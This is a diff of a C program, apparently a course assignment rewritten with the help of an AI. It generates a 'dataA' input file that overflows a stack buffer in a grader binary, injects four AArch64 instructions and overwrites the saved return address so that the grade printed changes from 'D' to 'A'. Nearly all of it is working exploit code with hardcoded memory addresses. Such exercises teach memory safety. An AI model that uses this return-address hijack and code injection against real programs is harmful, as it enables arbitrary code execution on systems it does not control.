@@ -4,102 +4,106 @@
 /*--------------------------------------------------------------------*/
 
 /*
-  this program builds a specialized input file named "dataA" that triggers 
-  the grader to print an 'A' grade. the underlying tactic is a buffer-overrun
-  exploit, which places custom instructions into memory in order to replace
-  the existing grade character 'D' with 'A'.
+   this code constructs a "dataA" file that is carefully engineered to
+   trick the grader program into displaying 'A' as the final grade. we
+   accomplish this by overflowing a buffer to inject instructions that
+   overwrite the 'grade' variable with 'A' and then jump back into the
+   normal printing routine.
 
-  here’s the general approach:
-  - write a chosen username and properly null-terminate it.
-  - pad the output with a number of zero bytes to overflow stack memory so 
-    that our malicious instructions land exactly where desired.
-  - generate a small sequence of instructions:
-       * load 'A' into w0
-       * compute the grade variable's address via adr and store that in x1
-       * write 'A' into the grade variable using strb
-       * branch back to the normal print grade location
-  - overwrite the function's saved return address so that, upon returning, 
-    execution resumes at our inserted instructions rather than where the 
-    compiler originally intended.
+   steps at a glance:
+   - write a chosen username and terminate it with a null byte.
+   - add enough padding nulls to force the return address overwrite region.
+   - create instructions that load 'A', point to the grade variable, store
+     'A' there, and then branch back to the printing logic in main.
+   - overwrite the function return address so execution transfers to our
+     injected instructions instead of returning normally.
 */
 
 /*
-  runtime specifics:
-  - no command-line arguments are interpreted.
-  - no input is read from stdin.
-  - output is directed solely into "dataA".
-  - if an error occurs (like a file not opening), print an error message to stderr.
-  - returns 0 on success, 1 on failure.
+   runtime details:
+   - no command-line arguments are read or processed.
+   - does not read standard input or any other input stream.
+   - writes only to a file named "dataA".
+   - returns 0 if successful, 1 on file-related failure.
 */
 
 #include <stdio.h>
 #include <stdint.h>
 #include "miniassembler.h"
 
-/* constants based on static analysis of grader's memory map */
+/* constants derived through analysis of the grader binary */
 enum {
-    SZ_NAME            = 9,        /* length of "AnishKKat" minus the null terminator */
-    CT_PADDING         = 22,       /* number of zero bytes needed to pad stack space */
-    ASCII_A_VAL        = 0x41,     /* 'A' in ASCII code */
-    ADDR_VAR_GRADE     = 0x420044, /* location of 'grade' in data segment */
-    ADDR_PRINT_ROUTINE = 0x40089c, /* address where we jump back to print logic */
-    ADDR_NEW_RET       = 0x420078, /* new return address where execution is diverted */
-    ADDR_ADR_REF       = 0x42007c  /* reference address for the ADR instruction */
+    NAME_SIZE         = 9,        /* length of the username "AnishKKat" without terminating null */
+    NUM_PADDING       = 22,       /* number of null bytes to push beyond stack boundaries */
+    ASCII_A           = 0x41,     /* ASCII code for 'A' */
+    ADDR_GRADE_VAR    = 0x420044, /* address of the 'grade' variable */
+    ADDR_PRINT_CODE   = 0x40089c, /* address in main code to print the grade */
+    ADDR_RET_INJECTED = 0x420078, /* new return address pointing to our instructions */
+    ADDR_REF_ADR      = 0x42007c  /* reference point for adr calculation */
 };
 
 int main(void) {
-    /* a chosen identity placed into the bss array, mimicking a user input */
-    const char *pszInjectedName = "AnishKKat";
+    /* c89 requires all declarations at the start of the block */
+    const char *pszUsername = "AnishKKat";
+    FILE *pFileOut;
+    unsigned int uiInstrMov;
+    unsigned int uiInstrAdr;
+    unsigned int uiInstrStrb;
+    unsigned int uiInstrBranch;
+    unsigned long ulNewRetAddr;
+    int iCount;
+    char cNullByte;
+    unsigned int uiInstructionBlock[4];
 
-    /* file pointer for output */
-    FILE *pOutFile = fopen("dataA", "w");
-    if (!pOutFile) {
-        fprintf(stderr, "error: unable to open dataA for output.\n");
+    /* open the output file early and check for errors before writing */
+    pFileOut = fopen("dataA", "wb"); /* explicitly use "wb" for binary mode */
+    if (pFileOut == NULL) {
+        /* print an error if unable to open file as per user request */
+        fprintf(stderr, "error: cannot open dataA for writing.\n");
         return 1;
     }
 
-    /* instructions that we will embed into the overflowed buffer */
-    unsigned int uiInsLoadA;         /* mov w0, 'A' */
-    unsigned int uiInsGetGradeAddr;  /* adr x1, [grade variable address] */
-    unsigned int uiInsStoreA;        /* strb w0, [x1] */
-    unsigned int uiInsBranchPrint;   /* b [print routine] */
+    /* assign null byte once for clarity and reuse */
+    cNullByte = '\0';
 
-    /* return address override and loop counter */
-    unsigned long ulOverrideReturn;
-    int iOffset;
+    /* first write the username followed by a null terminator */
+    fwrite(pszUsername, 1, NAME_SIZE, pFileOut);
+    fputc(cNullByte, pFileOut);
 
-    /* first: write the chosen name and append a null terminator */
-    fwrite(pszInjectedName, 1, SZ_NAME, pOutFile);
-    fputc('\0', pOutFile);
-
-    /* add a series of zero bytes to push our instructions into the right place.
-       this ensures that when the function returns, it lands exactly on our code. */
-    iOffset = 0;
-    while (iOffset < CT_PADDING) {
-        fputc('\0', pOutFile);
-        iOffset++;
+    /* add padding null bytes to overflow stack and position code injection */
+    iCount = 0;
+    while (iCount < NUM_PADDING) {
+        fputc(cNullByte, pFileOut);
+        iCount++;
     }
 
-    /* now produce the instructions:
-       1) mov w0, 'A' - load 'A' into w0 register
-       2) adr x1, ADDR_VAR_GRADE @ ADDR_ADR_REF - get the grade variable address in x1
-       3) strb w0, [x1] - store 'A' into the grade memory location
-       4) b ADDR_PRINT_ROUTINE - jump back to printing logic, now grade is 'A' */
-    uiInsLoadA        = MiniAssembler_mov(0, ASCII_A_VAL);
-    uiInsGetGradeAddr = MiniAssembler_adr(1, ADDR_VAR_GRADE, ADDR_ADR_REF);
-    uiInsStoreA       = MiniAssembler_strb(0, 1);
-    uiInsBranchPrint  = MiniAssembler_b(ADDR_PRINT_ROUTINE, ADDR_ADR_REF + 8);
+    /*
+       generate instructions using the miniassembler:
+       1) mov w0, 'A'     (load 'A' character into w0)
+       2) adr x1, grade   (load the address of 'grade' into x1)
+       3) strb w0, [x1]   (store 'A' into the grade variable)
+       4) b ADDR_PRINT_CODE (branch back to the printing code)
+    */
 
-    /* write instructions in the sequence they must execute */
-    fwrite(&uiInsLoadA,        sizeof(unsigned int), 1, pOutFile);
-    fwrite(&uiInsGetGradeAddr, sizeof(unsigned int), 1, pOutFile);
-    fwrite(&uiInsStoreA,       sizeof(unsigned int), 1, pOutFile);
-    fwrite(&uiInsBranchPrint,  sizeof(unsigned int), 1, pOutFile);
+    uiInstrMov   = MiniAssembler_mov(0, ASCII_A);
+    uiInstrAdr   = MiniAssembler_adr(1, ADDR_GRADE_VAR, ADDR_REF_ADR);
+    uiInstrStrb  = MiniAssembler_strb(0, 1);
+    uiInstrBranch= MiniAssembler_b(ADDR_PRINT_CODE, ADDR_REF_ADR + 8);
 
-    /* overwrite the return pointer so that control flow jumps into our instructions */
-    ulOverrideReturn = ADDR_NEW_RET;
-    fwrite(&ulOverrideReturn, sizeof(unsigned long), 1, pOutFile);
+    /* store instructions in an array before writing them, a slight restructuring */
+    uiInstructionBlock[0] = uiInstrMov;
+    uiInstructionBlock[1] = uiInstrAdr;
+    uiInstructionBlock[2] = uiInstrStrb;
+    uiInstructionBlock[3] = uiInstrBranch;
 
-    fclose(pOutFile);
+    /* write all the instructions at once */
+    fwrite(uiInstructionBlock, sizeof(unsigned int), 4, pFileOut);
+
+    /* finally, overwrite the stored return address with ADDR_RET_INJECTED */
+    ulNewRetAddr = ADDR_RET_INJECTED;
+    fwrite(&ulNewRetAddr, sizeof(unsigned long), 1, pFileOut);
+
+    /* close file and end */
+    fclose(pFileOut);
     return 0;
 }
